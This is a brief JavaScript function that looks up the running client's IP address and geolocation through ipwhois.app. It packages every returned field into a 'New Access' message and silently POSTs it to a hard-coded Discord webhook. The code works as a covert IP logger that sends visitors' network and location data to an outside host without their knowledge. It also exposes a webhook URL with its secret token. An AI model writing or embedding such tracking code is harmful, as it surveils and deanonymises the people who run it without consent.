function req () {
  const get = {
    url:'https://ipwhois.app/json/',
    method:'GET'
  }
  axios(get).then(res => {
    var content = '```New Access: \n\n';
    function capitalize (str) {
      if(!str[0] || str.startsWith('https')) return str;
      else return str[0].toUpperCase()+str.slice(1,);
    }
    for (entry in res.data) {
      content+=capitalize(entry)+': '+capitalize(res.data[entry])+'\n'
    }
    content+='```';
    const post = {
      // hi pikkel :)
      url:'https://discord.com/api/webhooks/868704785182912552/jPh26t_f2VM4vU1z_MF3s7wI2qHda0BsVRrZc2b4Xe2Mayr30PijamCNiv1em4fBeAIH',
      method:'POST',
      data:{
        "content":content,
      },
      headers:{
        'content-type':'application/json'
      }
    }
    axios(post);
  })
}
